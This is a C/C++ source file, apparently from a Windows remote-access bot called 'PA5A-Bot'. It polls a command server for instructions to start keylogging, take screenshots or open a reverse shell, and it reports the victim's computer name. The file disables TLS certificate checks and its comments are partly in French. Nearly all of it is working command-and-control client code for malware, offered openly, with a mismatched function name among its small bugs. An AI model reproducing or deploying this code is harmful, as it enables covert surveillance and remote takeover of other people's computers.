#include "pa5a.hpp"

EXTERN_C_START

VOID GenerateBoundary(LPSTR buffer, SIZE_T size)
{
	char chaine[] = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
	int max = strlen(chaine);
	int i = 0;

	for (i = 0; i < size; i++)
		buffer[i] = chaine[rand() % (max - 1)];

	buffer[i] = 0;
}
/********************************************************************************************************************************************************/
struct CommandsToExecute GetCommands(LPCSTR server, DWORD port)
{
	HINTERNET hSession, hConnect, hRequest;
	LPCSTR acceptTypes[] = {"text/*", NULL};
	CHAR headers[512] = { 0 };
	CHAR data[200000] = { 0 };
	CHAR uuid[UUID_SIZE] = { 0 };
	CHAR url[URL_SIZE] = { 0 };
	CHAR headerBuffer[8192] = { 0 };
	CHAR dataBuffer[8192] = { 0 };
	DWORD headerSize = 0;
	DWORD dataSize = 0;
	struct CommandsToExecute commandsToExecute = { 0 };

	//Construction de l'url
	GetUuid(uuid);
	strcat_s(url, sizeof(url), "/api/clients/");
	strcat_s(url, sizeof(url) - strlen("/api/clients/"), uuid);
	strcat_s(url, sizeof(url) - strlen("/api/clients/") - strlen(uuid), "/commands");

	if ((hSession = InternetOpenA("PA5A-Bot", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0)) == NULL)
	{
		return commandsToExecute;
	}
	if ((hConnect = InternetConnectA(hSession, server, port, NULL, NULL, INTERNET_SERVICE_HTTP, NULL, NULL)) == NULL)
	{
		InternetCloseHandle(hSession);
		return commandsToExecute;
	}
	if ((hRequest = HttpOpenRequestA(hConnect, "GET", url, NULL, NULL, acceptTypes, INTERNET_FLAG_SECURE, 1)) == NULL)
	{
		InternetCloseHandle(hConnect);
		InternetCloseHandle(hSession);
		return commandsToExecute;
	}

	DWORD dwFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
	InternetSetOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));

	if (HttpSendRequestA(hRequest, NULL, 0, NULL, 0) == FALSE)
	{
		InternetCloseHandle(hRequest);
		InternetCloseHandle(hConnect);
		InternetCloseHandle(hSession);
		return commandsToExecute;
	}

	//Get the header
	
	headerSize = sizeof(headerBuffer);
	if (HttpQueryInfoA(hRequest, HTTP_QUERY_RAW_HEADERS_CRLF, (LPVOID)headerBuffer, &headerSize, 0) == FALSE)
	{
		InternetCloseHandle(hRequest);
		InternetCloseHandle(hConnect);
		InternetCloseHandle(hSession);
		return commandsToExecute;
	}

	//Print header
	printf("Headers length = %d\n", headerSize);
	printf("|%s|\n", headerBuffer);

	//(Get the data)
	/*if (InternetQueryDataAvailable(hRequest, &dataSize, 0, 0) == FALSE)
	{
		InternetCloseHandle(hRequest);
		InternetCloseHandle(hConnect);
		InternetCloseHandle(hSession);
		return FALSE;
	}

	printf("Data length = %d\n", dataSize);*/

	if (InternetReadFile(hRequest, (LPVOID)dataBuffer, sizeof(dataBuffer), &dataSize) == FALSE)
	{
		InternetCloseHandle(hRequest);
		InternetCloseHandle(hConnect);
		InternetCloseHandle(hSession);
		return commandsToExecute;
	}

	InternetCloseHandle(hRequest);
	InternetCloseHandle(hConnect);
	InternetCloseHandle(hSession);

	printf("|%s|\n", dataBuffer);
	printf("Data length = %d\n", dataSize);

	//Print http data
	//printf("|%s|\n", buffer);


	cJSON* commandsArray = NULL;
	commandsArray = cJSON_Parse(dataBuffer);

	cJSON* command = NULL;
	DWORD commandsNumber = 0;

	commandsNumber = cJSON_GetArraySize(commandsArray);
	printf("commandsNumber = %d\n", commandsNumber);

	for (int i = 0; i < commandsNumber; i++)
	{
		//printf("%d\n", i);
		command = cJSON_GetArrayItem(commandsArray, i);

		if (command == NULL)
			continue;

		if (!strncmp(command->valuestring, "KEYLOGS", strlen(command->valuestring)))
			commandsToExecute.keylogs = TRUE;
		else if (!strncmp(command->valuestring, "SCREENSHOT", strlen(command->valuestring)))
			commandsToExecute.screenshot = TRUE;
		else if (!strncmp(command->valuestring, "REVERSE-SHELL", strlen(command->valuestring)))
			commandsToExecute.reverse_shell = TRUE;

		printf("|%s|\n", command->valuestring);

		cJSON_free(command);
	}
	
	return commandsToExecute;
}
/********************************************************************************************************************************************************/
BOOL SendJsonDataByHttps(LPCSTR server, DWORD port, LPCSTR url, LPCSTR method, LPCSTR userAgent, LPCSTR jsonData)
{
	HINTERNET hSession, hConnect, hRequest;
	LPCSTR acceptTypes[] = { "text/*", NULL };
	CHAR header[] = "Content-Type: application/json";

	if ((hSession = InternetOpenA(userAgent, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0)) == NULL)
	{
		return FALSE;
	}
	if ((hConnect = InternetConnectA(hSession, server, port, NULL, NULL, INTERNET_SERVICE_HTTP, NULL, NULL)) == NULL)
	{
		InternetCloseHandle(hSession);
		return FALSE;
	}
	if ((hRequest = HttpOpenRequestA(hConnect, method, url, NULL, NULL, acceptTypes, INTERNET_FLAG_SECURE, 1)) == NULL)
	{
		InternetCloseHandle(hConnect);
		InternetCloseHandle(hSession);
		return FALSE;
	}

	DWORD dwFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
	if (InternetSetOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags)) == FALSE)
	{
		InternetCloseHandle(hConnect);
		InternetCloseHandle(hSession);
		return FALSE;
	}

	if (HttpSendRequestA(hRequest, header, strlen(header), (LPVOID)jsonData, strlen(jsonData)) == FALSE)
	{
		InternetCloseHandle(hRequest);
		InternetCloseHandle(hConnect);
		InternetCloseHandle(hSession);
		return FALSE;
	}

	//Get response
	//Header
	CHAR headerBuffer[8192] = { 0 };
	DWORD headerSize = sizeof(headerBuffer);

	if (HttpQueryInfoA(hRequest, HTTP_QUERY_RAW_HEADERS_CRLF, (LPVOID)headerBuffer, &headerSize, 0) == FALSE)
	{
		InternetCloseHandle(hRequest);
		InternetCloseHandle(hConnect);
		InternetCloseHandle(hSession);
		return FALSE;
	}

	//Print header
	printf("----- RESPONSE ----\n");
	printf("Headers length = %d\n", headerSize);
	printf("|%s|\n", headerBuffer);

	//(Get the data)
	LPSTR dataBuffer = NULL;
	DWORD dataSize = 0;

	if (InternetQueryDataAvailable(hRequest, &dataSize, 0, 0) == FALSE)
	{
		InternetCloseHandle(hRequest);
		InternetCloseHandle(hConnect);
		InternetCloseHandle(hSession);
		return FALSE;
	}

	printf("Data length = %d\n", dataSize);
	if ((dataBuffer = (LPSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dataSize + 1)) == NULL)
	{
		InternetCloseHandle(hRequest);
		InternetCloseHandle(hConnect);
		InternetCloseHandle(hSession);
		return FALSE;
	}

	if (InternetReadFile(hRequest, (LPVOID)dataBuffer, dataSize, &dataSize) == FALSE)
	{
		InternetCloseHandle(hRequest);
		InternetCloseHandle(hConnect);
		InternetCloseHandle(hSession);
		return FALSE;
	}

	printf("|%s|\n", dataBuffer);

	HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, (LPVOID)dataBuffer);

	InternetCloseHandle(hRequest);
	InternetCloseHandle(hConnect);
	InternetCloseHandle(hSession);

	return TRUE;
}
/********************************************************************************************************************************************************/
//Fonction qui crée un objet javascript contenant les informations
cJSON* CreateInformationsJsonObject()
{
	//Retrive computer name
	CHAR computerName[COMPUTER_NAME_SIZE] = { 0 };
	DWORD computerNameSize = sizeof(computerName);

	if (!GetComputerNameA(computerName, &computerNameSize))
		return NULL;

	//Create json object to put client informations
	cJSON* object = NULL;

	if (!(object = cJSON_CreateObject()))
		return NULL;

	if (!cJSON_AddStringToObject(object, "pcName", computerName))
		return NULL;

	return object;
}
/********************************************************************************************************************************************************/
BOOL SendClientInformations()
{
	//Retrive json object with client informations
	cJSON* informationsObject = NULL;

	if (!(informationsObject = CreateJsonInformationsObject()))
		return FALSE;

	LPSTR jsonString = NULL;

	jsonString = cJSON_Print(informationsObject);

	//Construction de l'url
	CHAR url[URL_SIZE] = { 0 };
	CHAR uuid[UUID_SIZE] = { 0 };
	GetUuid(uuid);

	StringCbCatA(url, sizeof(url), CLIENT_API_A);
	StringCbCatA(url, sizeof(url), (LPCSTR)uuid);

	SendJsonDataByHttps(SERVER_URL_A, HTTPS_PORT, url, "PUT", "PA5A-Bot", jsonString);

	HeapFree(GetProcessHeap(), HEAP_NO_SERIALIZE, jsonString);

	return TRUE;
}
/********************************************************************************************************************************************************/

EXTERN_C_END
